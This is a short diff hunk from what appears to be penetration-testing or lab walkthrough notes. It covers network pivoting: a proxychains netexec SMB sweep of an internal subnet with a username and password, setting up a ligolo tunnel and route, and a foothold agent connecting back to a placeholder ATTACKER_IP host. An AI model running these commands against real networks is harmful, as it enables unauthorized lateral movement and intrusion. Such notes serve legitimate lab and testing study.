@@ -43,7 +43,7 @@ proxychains -q netexec smb 172.16.5.0/24 -u jsmith -p 'Winter2026!'
 sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
 sudo ip route add 172.16.5.0/24 dev ligolo
 # On the foothold: connect the agent back
-./agent -connect 10.10.14.5:11601 -ignore-cert
+./agent -connect ATTACKER_IP:11601 -ignore-cert
 # In the proxy console: session; start -> now reach 172.16.5.0/24 directly
 ```
 
